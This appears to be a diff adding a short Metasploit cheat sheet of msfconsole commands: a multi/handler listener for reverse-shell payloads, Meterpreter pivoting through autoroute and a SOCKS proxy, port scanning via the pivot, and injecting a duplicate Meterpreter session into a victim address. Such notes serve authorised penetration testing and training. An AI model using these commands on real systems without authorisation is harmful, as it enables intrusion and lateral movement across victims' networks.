@@ -1,0 +1,24 @@
+% msfconsole
+
+# listener handler
+msfconsole -q -x "use multi/handler; set payload <PAYLOAD>; set lhost <LHOST>; set lport <PORT>; exploit"
+
+# meterpreter pivoting
+use multi/manage/autoroute
+set session <SESSION>
+exploit
+use auxiliary/server/socks_proxy
+set srvhost 127.0.0.1
+exploit -j
+
+# port scan via pivot
+use auxiliary/scanner/portscan/tcp
+set RHOST <TARGET_IP>
+
+# duplicate meterpreter session start background multi/handler first 
+use post/windows/manage/multi_meterpreter_inject
+set iplist <VICTIM_IP>
+set lport 443
+set payload <PAYLOAD>
+set session <SESSION>
+exploit
